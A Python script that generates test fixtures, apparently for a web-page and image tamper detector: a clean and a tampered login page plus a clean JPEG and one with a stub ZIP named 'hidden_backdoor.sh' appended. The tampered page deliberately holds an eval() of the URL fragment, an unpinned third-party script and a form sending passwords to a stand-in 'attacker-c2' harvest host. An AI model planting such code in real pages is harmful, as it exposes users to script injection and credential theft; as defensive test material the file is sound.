import os
import struct

os.makedirs('samples', exist_ok=True)

# 1. Clean HTML
clean_html = b"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Secure Portal Login</title>
  <script src="https://cdn.example.net/security.js" integrity="sha384-oqVuAfXRKap7fdgcCY5uykM6+R9GqQ8K/uxy9rx7HNQlGYl1kPzQho1wx4JwY8wC" crossorigin="anonymous"></script>
</head>
<body>
  <h2>Customer Sign In</h2>
  <form action="/api/auth/login" method="POST">
    <label>Username: <input type="text" name="user"></label><br>
    <label>Password: <input type="password" name="pass"></label><br>
    <button type="submit">Log In</button>
  </form>
</body>
</html>"""

with open('samples/clean_page.html', 'wb') as f:
    f.write(clean_html)

# 2. Tampered / Insecure HTML
tampered_html = b"""<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Secure Portal Login</title>
  <!-- 1. MISSING Subresource Integrity (SRI) on external CDN -->
  <script src="https://cdn.untrusted-thirdparty.net/unpinned.js"></script>
  <!-- 2. MALICIOUS inline script: dangerous eval() -->
  <script>
    var hash = location.hash.slice(1);
    eval(hash); 
    document.write('Session expired');
  </script>
</head>
<body>
  <h2>Customer Sign In</h2>
  <!-- 3. PHISHING EXFILTRATION: Sends passwords over plain HTTP to external server -->
  <form action="http://attacker-c2.example.com/harvest" method="POST">
    <label>Username: <input type="text" name="user"></label><br>
    <label>Password: <input type="password" name="pass"></label><br>
    <button type="submit">Log In</button>
  </form>
</body>
</html>"""

with open('samples/tampered_page.html', 'wb') as f:
    f.write(tampered_html)

# 3. Clean JPEG Image
def seg(marker, body):
    return bytes([0xFF, marker]) + struct.pack('>H', len(body) + 2) + body

base_jpeg = (
    b'\xff\xd8'
    + seg(0xE0, b'JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00')
    + seg(0xDB, b'\x00' + bytes(64))
    + seg(0xC0, b'\x08\x00\x01\x00\x01\x01\x01\x11\x00')
    + seg(0xDA, b'\x01\x01\x00\x00\x3f\x00')
    + b'\x12\x34\xff\x00\x56\xff\xd0\x78'
    + b'\xff\xd9'  # End of Image marker
)

with open('samples/clean_photo.jpg', 'wb') as f:
    f.write(base_jpeg)

# 4. Tampered JPEG Image (Polyglot with hidden ZIP payload attached after EOF)
zip_payload = b'PK\x03\x04\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00' + b'hidden_backdoor.sh' + bytes(30)
with open('samples/tampered_photo.jpg', 'wb') as f:
    f.write(base_jpeg + zip_payload)

print('Generated sample test files in samples/ successfully!')


